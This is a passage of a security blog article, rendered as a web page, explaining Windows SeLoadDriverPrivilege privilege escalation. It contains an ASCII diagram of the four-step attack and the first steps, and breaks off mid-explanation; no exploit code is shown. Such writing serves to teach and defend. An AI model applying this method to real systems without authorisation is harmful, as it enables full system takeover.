<!DOCTYPE html>
<html lang="en-us">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    
    <meta name="generator" content="Hugo 0.140.0">

    <script src="js/custom.js"></script>
    

    

    
        
            <meta
                name="description"
                content="Bones &amp; All Cyber Security" />
        

        
            <meta
                name="keywords"
                content="hacking, AD, hack the box, HTB, security, pentesting, cybersecurity, pentester, active-directory" />
        

        
            <meta name="author" content="bloodstiller" />
        

    


    <title>
        
            Understanding SeLoadDriverPrivilege Escalation: A Deep Dive |
            Hack the planet
        
    </title>

    


    
    

    
    


    
    


    
    


    
    

    


    
    

    

    

        
            
            <link
                rel="stylesheet"
                href="/reset.min_6107201571472815285.3662e40c85350bf0bcf308b7db81c173e4b690b862d3c3cde460de5155550bf055b7ff48cddb1cf5255e55f0355196d8dec1d49434b2457842cc77ebea198f3f.css"
                integrity="sha512-NmLkDIU1C/C88wi324HBc&#43;S2kLhi08PN5GDeUVVVC/BVt/9Izdsc9SVeVfA1UZbY3sHUlDSyRXhCzHfr6hmPPw==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/01_layout.5974c097ff194e0a64d31c28fc478cc38b6290fe28d2cc2dbf5ae52a66751db74e4e7374bc4e25f464ea679f74cd86c474a5367e05c2db34a1b9b273466691e0.css"
                integrity="sha512-WXTAl/8ZTgpk0xwo/EeMw4tikP4o0swtv1rlKmZ1HbdOTnN0vE4l9GTqZ590zYbEdKU2fgXC2zShubJzRmaR4A==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/02_style.8484c853cc558c1c2189842f955ad4be9bf66854698f03f140aef3cfc23174c78eb1ab05b915b7877afac7464e5d70d467c87c1fb3fcbe11a75d379de01e0798.css"
                integrity="sha512-hITIU8xVjBwhiYQvlVrUvpv2aFRpjwPxQK7zz8IxdMeOsasFuRW3h3r6x0ZOXXDUZ8h8H7P8vhGnXTed4B4HmA==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/03_home.6d64455a82e28b01e58f3c37541add9e36fc8ed87562dac91ff06da3f7f11b32ac1cacaa593b2ab2e01acd894659f66c249bd0a261f051038f19a8734c3e1243.css"
                integrity="sha512-bWRFWoLiiwHljzw3VBrdnjb8jth1YtrJH/Bto/fxGzKsHKyqWTsqsuAazYlGWfZsJJvQomHwUQOPGahzTD4SQw==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/04_responsive.065451199c1e1cd4f86ac1c8733e3c77eaf215b4972cefff7e7929a2837f5b2cc0e0a04f99f34d58e082812d6102c8cc9b358d21db784e9c4d5e5a8c79f4bc43.css"
                integrity="sha512-BlRRGZweHNT4asHIcz48d&#43;ryFbSXLO//fnkpooN/WyzA4KBPmfNNWOCCgS1hAsjMmzWNIdt4TpxNXlqMefS8Qw==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/05_markdown.9afaac6b0a75a2cd9086fb9684dfae53bd04b90e034a252e123a9822c3fa6a5c8a3f88211159b1bd0c6918d19ed7bf3e929ff12de51d06fab0eea77e2374f967.css"
                integrity="sha512-mvqsawp1os2QhvuWhN&#43;uU70EuQ4DSiUuEjqYIsP6alyKP4ghEVmxvQxpGNGe178&#43;kp/xLeUdBvqw7qd&#43;I3T5Zw==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/06_image.ee39fc51345f4c74b8c491bde29d5b2053688d0cc6e937f5660e0f5e3665212473f4cb408cd1749317343308aa41ef1baca3ec3f3aff986ab3764c822790008f.css"
                integrity="sha512-7jn8UTRfTHS4xJG94p1bIFNojQzG6Tf1Zg4PXjZlISRz9MtAjNF0kxc0MwiqQe8brKPsPzr/mGqzdkyCJ5AAjw==" />
        

    


    
    

    

    

    

    


</head>



    <body>
        <header class="header">
    <div class="header_left">
        
    </div>

    <div class="header_middle">
        
            Understanding SeLoadDriverPrivilege Escalation: A Deep Dive -
            Hack the planet
        
    </div>
</header>



        <main>
            <aside class="sidebar">
    



    
    

    
    


    <ul class="section-tree">
        
            
                <li
                    
                        class="dir closed-dir"
                    >
                    <span class="dir-text"> Walkthroughs </span>

                    



    
    

    
    


    <ul class="section-tree">
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/editorial-box/" title="./walkthroughs/editorial-box/">
                        
                            Editorial HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/doctor-box/" title="./walkthroughs/doctor-box/">
                        
                            Doctor HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/forest-box/" title="./walkthroughs/forest-box/">
                        
                            Forest HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/driver-box/" title="./walkthroughs/driver-box/">
                        
                            Driver HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/timelapse-box/" title="./walkthroughs/timelapse-box/">
                        
                            Timelapse HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/certified-box/" title="./walkthroughs/certified-box/">
                        
                            Certified HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/aero-box/" title="./walkthroughs/aero-box/">
                        
                            Aero HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/administrator-box/" title="./walkthroughs/administrator-box/">
                        
                            Administrator HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/sauna-box/" title="./walkthroughs/sauna-box/">
                        
                            Sauna HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/active-box/" title="./walkthroughs/active-box/">
                        
                            Active HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/cicada-box/" title="./walkthroughs/cicada-box/">
                        
                            Cicada HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/authority-box/" title="./walkthroughs/authority-box/">
                        
                            Authority HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/evilcups-box/" title="./walkthroughs/evilcups-box/">
                        
                            EvilCUPS HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/resolute-box/" title="./walkthroughs/resolute-box/">
                        
                            Resolute HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/fuse-box/" title="./walkthroughs/fuse-box/">
                        
                            Fuse HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/cascade-box/" title="./walkthroughs/cascade-box/">
                        
                            Cascade HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/monteverde-box/" title="./walkthroughs/monteverde-box/">
                        
                            Monteverde HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/outdated-box/" title="./walkthroughs/outdated-box/">
                        
                            Outdated HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/scrambled-box/" title="./walkthroughs/scrambled-box/">
                        
                            Scrambled HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/escape-box/" title="./walkthroughs/escape-box/">
                        
                            Escape HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/hospital-box/" title="./walkthroughs/hospital-box/">
                        
                            Hospital HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/intelligence-box/" title="./walkthroughs/intelligence-box/">
                        
                            Intelligence HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/manager-box/" title="./walkthroughs/manager-box/">
                        
                            Manager HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/access-box/" title="./walkthroughs/access-box/">
                        
                            Access HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/remote-box/" title="./walkthroughs/remote-box/">
                        
                            Remote HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/support-box/" title="./walkthroughs/support-box/">
                        
                            Support HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/return-box/" title="./walkthroughs/return-box/">
                        
                            Return HTB Walkthrough
                        
                    </a>
                </li>
            
        
    </ul>


                </li>
            
        
            
                <li
                    
                        class="dir opened-dir"
                    >
                    <span class="dir-text"> Articles </span>

                    



    
    

    
    


    <ul class="section-tree">
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/understandingasreproasting/" title="./articles/understandingasreproasting/">
                        
                            Understanding AS-REP Roasting Attacks: A Deep Dive
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/understandingdownloadcradles/" title="./articles/understandingdownloadcradles/">
                        
                            Understanding PowerShell Download Cradles: A Deep Dive
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/understanding2023-28252-clfs/" title="./articles/understanding2023-28252-clfs/">
                        
                            Understanding CVE-2023-28252: Deep Dive into the CLFS Privilege Escalation Vulnerability
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/understandingthemebleedcve-2023-38146/" title="./articles/understandingthemebleedcve-2023-38146/">
                        
                            Understanding CVE-2023-38146: Deep Dive into the ThemeBleed Vulnerability
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/understandingcupsexploitation/" title="./articles/understandingcupsexploitation/">
                        
                            Understanding the CUPS Exploit Chain: A Deep Dive into CVE-2024-4176, CVE-2024-4175, CVE-2024-4177 and CVE-2024-4076
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/understandingnopacexploit/" title="./articles/understandingnopacexploit/">
                        
                            Understanding the NoPac Exploit: A Deep Dive into CVE-2021-42278 and CVE-2021-42287
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/seloaddriverprivilegeescalation/" title="./articles/seloaddriverprivilegeescalation/">
                        
                            Understanding SeLoadDriverPrivilege Escalation: A Deep Dive
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/azureadconnectattack/" title="./articles/azureadconnectattack/">
                        
                            Understanding Azure AD Connect Exploitation &amp; Privilege Escalation
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/shadowcredentialsattack/" title="./articles/shadowcredentialsattack/">
                        
                            Understanding the Shadow Credentials Attack Vector
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/deserializationattacksexplained/" title="./articles/deserializationattacksexplained/">
                        
                            Understanding .NET Deserialization Exploits: A Deep Dive
                        
                    </a>
                </li>
            
        
    </ul>


                </li>
            
        
            
                <li
                    
                        class="dir closed-dir"
                    >
                    <span class="dir-text"> Tools </span>

                    



    
    

    
    


    <ul class="section-tree">
        
            
                <li class="file">
                    <a href="http://localhost:1313/tools/ldapire/" title="./tools/ldapire/">
                        
                            LDAPire: LDAP Enumeration Tool
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/tools/automatingqemukalivm/" title="./tools/automatingqemukalivm/">
                        
                            Automating Kali VM Setup with QEMU
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/tools/bloodserver/" title="./tools/bloodserver/">
                        
                            BloodServer: A Secure File Transfer Tool for Penetration Testers
                        
                    </a>
                </li>
            
        
    </ul>


                </li>
            
        
            
                <li
                    
                        class="dir closed-dir"
                    >
                    <span class="dir-text"> Cheatsheets </span>

                    



    
    

    
    


    <ul class="section-tree">
        
            
                <li class="file">
                    <a href="http://localhost:1313/cheatsheets/ldap-cheatsheet/" title="./cheatsheets/ldap-cheatsheet/">
                        
                            Attacking LDAP: Deep Dive &amp; Cheatsheet
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/cheatsheets/rpc-cheatsheet/" title="./cheatsheets/rpc-cheatsheet/">
                        
                            Attacking RPC: Deep Dive &amp; Cheat Sheet
                        
                    </a>
                </li>
            
        
    </ul>


                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/love-box/" title="./love-box/">
                        
                            Love HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/aboutme/" title="./aboutme/">
                        
                            about me
                        
                    </a>
                </li>
            
        
    </ul>


</aside>
<aside class="exapandable"></aside>


            
    <article class="main">
        <button
    class="sidebar-toggle-btn"
    type="menu"
    aria-expanded="false"
    aria-haspopup="true">
    <i class="bi bi-list"></i>
</button>



        <div class="title">
            <h1 class="title-header">
                Understanding SeLoadDriverPrivilege Escalation: A Deep Dive
            </h1>

            <div class="author-date-readtime">
                

                    
                        <div class="author" title="Author">
                            <i class="bi bi-person"></i>
                            <a
                                href="/author/bloodstiller/"
                                class="cat-btn">
                                bloodstiller
                            </a>
                        </div>
                    

                

                
                    <div class="date" title="Date">
                        <i class="bi bi-calendar3"></i>
                        <time
                            datetime="2024.20.10"
                            >2024.20.10
                        </time>
                    </div>
                

                
                    <div
                        class="readtime"
                        title="Time to Read">
                        <i class="bi bi-clock"></i>
                        12 mins to read
                    </div>
                
            </div>
        </div>

        <div class="article-meta">
            

            
                <div class="tags">
                    <i
                        class="bi bi-tags"
                        title="Tags"></i>
                    
                        <a
                            href="/tags/windows/"
                            class="tag-btn">
                            Windows
                        </a>
                    
                        <a
                            href="/tags/active-directory/"
                            class="tag-btn">
                            Active Directory
                        </a>
                    
                        <a
                            href="/tags/seloaddriverprivilege/"
                            class="tag-btn">
                            SeLoadDriverPrivilege
                        </a>
                    
                        <a
                            href="/tags/capcom/"
                            class="tag-btn">
                            Capcom
                        </a>
                    
                </div>
            

            
                <div class="breadcumb">
                    <i class="bi bi-folder"></i>
                    
    
    




<a href="http://localhost:1313/" class="bread-btn">
    
        <i class="bi bi-house-fill"></i>
    

    
        Home
    
</a>




    /



<a href="http://localhost:1313/articles/" class="bread-btn">
    

    
        Articles
    
</a>




    /



<a href="http://localhost:1313/articles/seloaddriverprivilegeescalation/" class="bread-btn">
    

    
        
            Understanding SeLoadDriverPrivilege Escalation: A Deep Dive
        

    
</a>

                </div>
            

            
        </div>

        
            <nav id="TableOfContents">
  <ul>
    <li><a href="#introduction">Introduction:</a>
      <ul>
        <li><a href="#understanding-seloaddriverprivilege">Understanding <code>SeLoadDriverPrivilege</code>:</a></li>
      </ul>
    </li>
    <li><a href="#the-exploitation-process">The Exploitation Process:</a>
      <ul>
        <li><a href="#overview-and-diagram">Overview &amp; Diagram:</a></li>
        <li><a href="#step-1-enabling-the-seloaddriverprivilege-privilege">Step 1: Enabling the SeLoadDriverPrivilege Privilege:</a></li>
        <li><a href="#step-2-registry-interaction">Step 2: Registry Interaction:</a></li>
        <li><a href="#step-3-loading-a-vulnerable-driver">Step 3: Loading a Vulnerable Driver:</a></li>
        <li><a href="#step-4-exploiting-the-driver">Step 4: Exploiting the Driver:</a></li>
      </ul>
    </li>
    <li><a href="#capcom-dot-sys-driver-vulnerability-arbitrary-code-execution-with-system-privileges">Capcom.sys Driver Vulnerability: Arbitrary Code Execution with SYSTEM Privileges</a>
      <ul>
        <li><a href="#overview-of-the-capcom-dot-sys-vulnerability">Overview of the Capcom.sys Vulnerability:</a></li>
      </ul>
    </li>
    <li><a href="#real-world-exploitation-example">Real-World Exploitation Example</a>
      <ul>
        <li><a href="#prerequisites">Prerequisites:</a></li>
        <li><a href="#finding-out-we-have-the-seloaddriverprivilege-privilege">Finding out we have the SeLoadDriverPrivilege privilege:</a></li>
        <li><a href="#checking-the-system-is-vulnerable-to-the-exploit">Checking the system is vulnerable to the exploit:</a></li>
        <li><a href="#executing-the-attack">Executing the Attack</a></li>
        <li><a href="#summary">Summary:</a></li>
      </ul>
    </li>
    <li><a href="#defending-against-seloaddriverprivilege-attacks">Defending Against SeLoadDriverPrivilege Attacks:</a></li>
    <li><a href="#conclusion">Conclusion:</a></li>
    <li><a href="#further-reading">Further Reading:</a></li>
    <li><a href="#frequently-asked-questions">Frequently Asked Questions:</a></li>
    <li><a href="#appendix">Appendix:</a></li>
  </ul>
</nav>
        


        <div class="content">
            
                <h2 id="introduction">Introduction:</h2>
<p>Among the various techniques employed by attackers, one particularly insidious method involves the exploitation of <code>SeLoadDriverPrivilege</code>. This Windows privilege, often overlooked, can serve as a powerful tool in the hands of malicious actors, enabling them to <strong>elevate their permissions</strong> and potentially <strong>gain complete control over a system</strong>.</p>
<p><strong>Key Points</strong>:</p>
<ul>
<li><code>SeLoadDriverPrivilege</code> is a Windows privilege that can be exploited for privilege escalation</li>
<li>It&rsquo;s often overlooked but can grant attackers significant control over a system</li>
<li>Understanding this vulnerability is crucial for system administrators and security professionals</li>
</ul>
<p>Let&rsquo;s dive into the world of <code>SeLoadDriverPrivilege</code> and explore how this seemingly innocuous privilege can become a significant security risk.</p>
<h3 id="understanding-seloaddriverprivilege">Understanding <code>SeLoadDriverPrivilege</code>:</h3>
<p>At its core, <code>SeLoadDriverPrivilege</code> grants the ability to <strong>load kernel-mode drivers</strong> into the Windows operating system. While this might sound benign, it&rsquo;s a capability that normally requires administrative permissions, and for good reason. <strong>Kernel-mode drivers operate at the highest level of the system</strong>, with unrestricted access to system resources. This level of access is precisely what makes <code>SeLoadDriverPrivilege</code> so attractive to attackers.</p>
<p>Typically, this privilege is assigned to administrative groups or specific users like <code>Print Operators</code>. It&rsquo;s represented in the Windows API by the constant <code>SE_LOAD_DRIVER_NAME</code>. However, what makes it particularly dangerous is that it can sometimes be found enabled on accounts that aren&rsquo;t full administrators, creating a potential security gap.</p>
<p><strong>Key Points</strong>:</p>
<ul>
<li><code>SeLoadDriverPrivilege</code> allows loading of kernel-mode drivers</li>
<li>Kernel-mode drivers have unrestricted access to system resources</li>
<li>This privilege is usually assigned to administrative groups but can sometimes be found on non-admin accounts</li>
<li>It&rsquo;s represented by <code>SE_LOAD_DRIVER_NAME</code> in the Windows API</li>
</ul>
<h2 id="the-exploitation-process">The Exploitation Process:</h2>
<h3 id="overview-and-diagram">Overview &amp; Diagram:</h3>
<p>To better understand the flow of a <code>SeLoadDriverPrivilege</code> exploit, let&rsquo;s look at a simplified diagram of the process:</p>







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="&#43;--------------------------------------------------&#43;%0a%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%0a%7c%20%20&#43;--------------------------------------------&#43;%20%20%7c%0a%7c%20%20%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%7c%0a%7c%20%20%7c%20%201.%20Enable%20SeLoadDriverPrivilege%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%7c%0a%7c%20%20%7c%20%20%20%20%20-%20OpenProcessToken%28%29%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%7c%0a%7c%20%20%7c%20%20%20%20%20-%20LookupPrivilegeValue%28%29%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%7c%0a%7c%20%20%7c%20%20%20%20%20-%20AdjustTokenPrivileges%28%29%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%7c%0a%7c%20%20%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%7c%0a%7c%20%20&#43;--------------------------------------------&#43;%20%20%7c%0a%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%0a%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20v%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%0a%7c%20%20&#43;--------------------------------------------&#43;%20%20%7c%0a%7c%20%20%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%7c%0a%7c%20%20%7c%20%202.%20Interact%20with%20Windows%20Registry%20%20%20%20%20%20%20%20%20%7c%20%20%7c%0a%7c%20%20%7c%20%20%20%20%20-%20Access%20HKLM%5cSYSTEM%5cCurrentControlSet%20%7c%20%20%7c%0a%7c%20%20%7c%20%20%20%20%20%20%20%5cServices%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%7c%0a%7c%20%20%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%7c%0a%7c%20%20&#43;--------------------------------------------&#43;%20%20%7c%0a%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%0a%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20v%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%0a%7c%20%20&#43;--------------------------------------------&#43;%20%20%7c%0a%7c%20%20%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%7c%0a%7c%20%20%7c%20%203.%20Load%20Vulnerable%20Driver%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%7c%0a%7c%20%20%7c%20%20%20%20%20-%20Register%20driver%20in%20registry%20%20%20%20%20%20%20%20%20%20%7c%20%20%7c%0a%7c%20%20%7c%20%20%20%20%20-%20Use%20NtLoadDriver%28%29%20to%20load%20driver%20%20%20%20%7c%20%20%7c%0a%7c%20%20%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%7c%0a%7c%20%20&#43;--------------------------------------------&#43;%20%20%7c%0a%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%0a%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20v%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%0a%7c%20%20&#43;--------------------------------------------&#43;%20%20%7c%0a%7c%20%20%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%7c%0a%7c%20%20%7c%20%204.%20Exploit%20Vulnerable%20Driver%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%7c%0a%7c%20%20%7c%20%20%20%20%20-%20Execute%20arbitrary%20code%20in%20kernel%20%20%20%20%20%7c%20%20%7c%0a%7c%20%20%7c%20%20%20%20%20%20%20space%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%7c%0a%7c%20%20%7c%20%20%20%20%20-%20Gain%20SYSTEM%20privileges%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%7c%0a%7c%20%20%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%20%20%7c%0a%7c%20%20&#43;--------------------------------------------&#43;%20%20%7c%0a%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%0a&#43;--------------------------------------------------&#43;">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>+--------------------------------------------------+
</span></span><span style="display:flex;"><span>|                                                  |
</span></span><span style="display:flex;"><span>|  +--------------------------------------------+  |
</span></span><span style="display:flex;"><span>|  |                                            |  |
</span></span><span style="display:flex;"><span>|  |  1. Enable SeLoadDriverPrivilege           |  |
</span></span><span style="display:flex;"><span>|  |     - OpenProcessToken<span style="color:#f92672">()</span>                   |  |
</span></span><span style="display:flex;"><span>|  |     - LookupPrivilegeValue<span style="color:#f92672">()</span>               |  |
</span></span><span style="display:flex;"><span>|  |     - AdjustTokenPrivileges<span style="color:#f92672">()</span>              |  |
</span></span><span style="display:flex;"><span>|  |                                            |  |
</span></span><span style="display:flex;"><span>|  +--------------------------------------------+  |
</span></span><span style="display:flex;"><span>|                       |                          |
</span></span><span style="display:flex;"><span>|                       v                          |
</span></span><span style="display:flex;"><span>|  +--------------------------------------------+  |
</span></span><span style="display:flex;"><span>|  |                                            |  |
</span></span><span style="display:flex;"><span>|  |  2. Interact with Windows Registry         |  |
</span></span><span style="display:flex;"><span>|  |     - Access HKLM<span style="color:#ae81ff">\S</span>YSTEM<span style="color:#ae81ff">\C</span>urrentControlSet |  |
</span></span><span style="display:flex;"><span>|  |       <span style="color:#ae81ff">\S</span>ervices                            |  |
</span></span><span style="display:flex;"><span>|  |                                            |  |
</span></span><span style="display:flex;"><span>|  +--------------------------------------------+  |
</span></span><span style="display:flex;"><span>|                       |                          |
</span></span><span style="display:flex;"><span>|                       v                          |
</span></span><span style="display:flex;"><span>|  +--------------------------------------------+  |
</span></span><span style="display:flex;"><span>|  |                                            |  |
</span></span><span style="display:flex;"><span>|  |  3. Load Vulnerable Driver                 |  |
</span></span><span style="display:flex;"><span>|  |     - Register driver in registry          |  |
</span></span><span style="display:flex;"><span>|  |     - Use NtLoadDriver<span style="color:#f92672">()</span> to load driver    |  |
</span></span><span style="display:flex;"><span>|  |                                            |  |
</span></span><span style="display:flex;"><span>|  +--------------------------------------------+  |
</span></span><span style="display:flex;"><span>|                       |                          |
</span></span><span style="display:flex;"><span>|                       v                          |
</span></span><span style="display:flex;"><span>|  +--------------------------------------------+  |
</span></span><span style="display:flex;"><span>|  |                                            |  |
</span></span><span style="display:flex;"><span>|  |  4. Exploit Vulnerable Driver              |  |
</span></span><span style="display:flex;"><span>|  |     - Execute arbitrary code in kernel     |  |
</span></span><span style="display:flex;"><span>|  |       space                                |  |
</span></span><span style="display:flex;"><span>|  |     - Gain SYSTEM privileges               |  |
</span></span><span style="display:flex;"><span>|  |                                            |  |
</span></span><span style="display:flex;"><span>|  +--------------------------------------------+  |
</span></span><span style="display:flex;"><span>|                                                  |
</span></span><span style="display:flex;"><span>+--------------------------------------------------+</span></span></code></pre></div>
    
</div>
<p>This diagram outlines the four main steps an attacker would typically follow when exploiting <code>SeLoadDriverPrivilege</code>. Let&rsquo;s dive deeper into each step.</p>
<ul>
<li>You can see an example of this attack on my walkthrough for Fuse:
<ul>
<li><a href="https://bloodstiller.com/walkthroughs/fuse-box/">https://bloodstiller.com/walkthroughs/fuse-box/</a></li>
</ul>
</li>
</ul>
<h3 id="step-1-enabling-the-seloaddriverprivilege-privilege">Step 1: Enabling the SeLoadDriverPrivilege Privilege:</h3>
<p>The first step involves activating the <code>SeLoadDriverPrivilege</code>. Windows uses a token-based system for managing user privileges, and <code>SeLoadDriverPrivilege</code> is usually disabled by default, even if it&rsquo;s assigned to a user. Attackers can use Windows API functions like <code>LookupPrivilegeValue()</code> and <code>AdjustTokenPrivileges()</code> to enable this privilege on their token.</p>
<h3 id="step-2-registry-interaction">Step 2: Registry Interaction:</h3>
<ul>
<li>Once activated, <code>SeLoadDriverPrivilege</code> allows interaction with a critical area of the Windows Registry: <code>HKLM\SYSTEM\CurrentControlSet\Services</code>.</li>
